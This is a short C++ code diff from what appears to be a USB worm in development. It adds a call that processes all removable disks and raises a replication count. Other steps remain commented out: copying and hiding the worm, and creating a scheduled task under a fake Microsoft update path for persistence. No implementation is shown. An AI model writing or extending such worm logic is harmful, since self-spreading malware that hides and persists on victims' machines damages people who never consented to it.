@@ -11,6 +11,10 @@ int main() {
 	for (const auto& a1 : get_removable_volume_paths()) {
 		wcout << a1 << endl;
 	};
+
+	worm1.process_all_removable_disks();
+
+
 	//worm1.scan_all_volumes();
 
 	
@@ -21,7 +25,7 @@ int main() {
 
 	worm1.print_file_to_copy();
 
-	worm1.replicate_files(1);
+	worm1.replicate_files(5);
 	*/
 	//worm1.copy_and_hide_worm();
 	//worm1.create_scheduled_task(L"%APPDATA%\\Microsoft\\Update\\update.exe");
